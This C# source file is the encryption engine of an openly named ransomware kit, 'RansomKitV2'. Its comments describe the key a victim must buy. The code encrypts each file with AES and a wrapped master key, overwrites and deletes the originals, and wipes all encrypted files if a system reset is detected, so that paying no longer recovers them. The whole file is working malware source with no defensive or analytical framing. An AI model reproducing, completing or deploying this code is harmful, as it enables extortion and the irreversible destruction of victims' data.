using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace RansomKitV2
{
    // ══════════════════════════════════════════════════════════════
    //  CryptoEngine
    //
    //  Scheme: AES-256-CBC per file, keys wrapped with a "master key"
    //
    //  On-disk file format (.locked):
    //    [64 bytes]  AES-CBC(masterKey, zeroIV, fileKey[32] ++ fileIV[16])
    //    [N  bytes]  AES-CBC(fileKey, fileIV, originalFile)
    //
    //  The master key is 32 random bytes.
    //  Encoded as Base64 it becomes the 44-char "password" the victim buys.
    //  The master key NEVER touches disk — only its SHA-256 hash is stored
    //  in the state file (for password verification).
    // ══════════════════════════════════════════════════════════════

    static class CryptoEngine
    {
        public const string LOCKED_EXT = ".locked";

        // ── Master key ────────────────────────────────────────────

        /// <summary>Generate a 32-byte cryptographically random master key.</summary>
        public static byte[] GenerateMasterKey()
        {
            byte[] k = new byte[32];
            RandomNumberGenerator.Fill(k);
            return k;
        }

        /// <summary>Base64-encode master key → 44-char password string.</summary>
        public static string MasterKeyToPassword(byte[] key)
            => Convert.ToBase64String(key);

        /// <summary>Decode password string → master key bytes. Returns null on failure.</summary>
        public static byte[]? PasswordToMasterKey(string pwd)
        {
            try
            {
                byte[] b = Convert.FromBase64String(pwd.Trim());
                return b.Length == 32 ? b : null;
            }
            catch { return null; }
        }

        /// <summary>SHA-256 hex of master key — stored in state for verification.</summary>
        public static string HashMasterKey(byte[] key)
            => Convert.ToHexString(SHA256.HashData(key));

        /// <summary>Verify a password string against the stored hash.</summary>
        public static bool VerifyPassword(string pwd, string storedHash)
        {
            byte[]? k = PasswordToMasterKey(pwd);
            if (k == null) return false;
            return HashMasterKey(k).Equals(storedHash, StringComparison.OrdinalIgnoreCase);
        }

        // ── File encryption ───────────────────────────────────────

        /// <summary>
        /// Encrypt <paramref name="path"/> in-place.
        /// Creates <paramref name="path"/>.locked, then securely deletes original.
        /// Returns false on any error.
        /// </summary>
        public static bool EncryptFile(string path, byte[] masterKey)
        {
            try
            {
                // Fresh random key+IV per file
                byte[] fk = new byte[32];
                byte[] fv = new byte[16];
                RandomNumberGenerator.Fill(fk);
                RandomNumberGenerator.Fill(fv);

                // Wrap key material: AES-256-CBC(masterKey, zeroIV, fk ++ fv)
                byte[] mat = new byte[48];
                Buffer.BlockCopy(fk, 0, mat,  0, 32);
                Buffer.BlockCopy(fv, 0, mat, 32, 16);
                byte[] header = AesCbc(mat, masterKey, new byte[16], encrypt: true); // 64 bytes

                byte[] plain  = File.ReadAllBytes(path);
                byte[] cipher = AesCbc(plain, fk, fv, encrypt: true);

                string locked = path + LOCKED_EXT;
                using (var fs = new FileStream(locked, FileMode.Create, FileAccess.Write))
                {
                    fs.Write(header, 0, header.Length); // 64 bytes
                    fs.Write(cipher, 0, cipher.Length);
                }

                SecureDelete(path);
                return true;
            }
            catch { return false; }
        }

        // ── File decryption ───────────────────────────────────────

        /// <summary>
        /// Decrypt a .locked file using the master key.
        /// Restores original, removes .locked file.
        /// </summary>
        public static bool DecryptFile(string lockedPath, byte[] masterKey)
        {
            try
            {
                byte[] raw = File.ReadAllBytes(lockedPath);
                if (raw.Length < 64) return false;

                byte[] header = raw[..64];
                byte[] cipher = raw[64..];

                byte[] mat    = AesCbc(header, masterKey, new byte[16], encrypt: false);
                byte[] fk     = mat[..32];
                byte[] fv     = mat[32..48];

                byte[] plain  = AesCbc(cipher, fk, fv, encrypt: false);

                string orig   = lockedPath[..^LOCKED_EXT.Length];
                File.WriteAllBytes(orig, plain);
                File.Delete(lockedPath);
                return true;
            }
            catch { return false; }
        }

        // ── Nuclear option ────────────────────────────────────────

        /// <summary>
        /// Zero-overwrite then delete all .locked files.
        /// Called when a Windows-reset process is detected.
        /// After this, even paying is useless — data is gone.
        /// </summary>
        public static void NukeLockedFiles(IEnumerable<string> paths)
        {
            foreach (var p in paths)
            {
                try { SecureDelete(p); } catch { }
            }
        }

        // ── Internal helpers ──────────────────────────────────────

        static byte[] AesCbc(byte[] data, byte[] key, byte[] iv, bool encrypt)
        {
            using var aes = Aes.Create();
            aes.Key     = key;
            aes.IV      = iv;
            aes.Mode    = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using var ms = new MemoryStream();
            using var cs = new CryptoStream(
                ms,
                encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor(),
                CryptoStreamMode.Write);

            cs.Write(data, 0, data.Length);
            cs.FlushFinalBlock();
            return ms.ToArray();
        }

        /// <summary>Overwrite file with zeros, then delete it.</summary>
        internal static void SecureDelete(string path)
        {
            try
            {
                long   len = new FileInfo(path).Length;
                byte[] buf = new byte[4096];
                using var fs = new FileStream(path, FileMode.Open, FileAccess.Write);
                long done = 0;
                while (done < len)
                {
                    int chunk = (int)Math.Min(4096, len - done);
                    fs.Write(buf, 0, chunk);
                    done += chunk;
                }
            }
            catch { }
            try { File.Delete(path); } catch { }
        }
    }
}
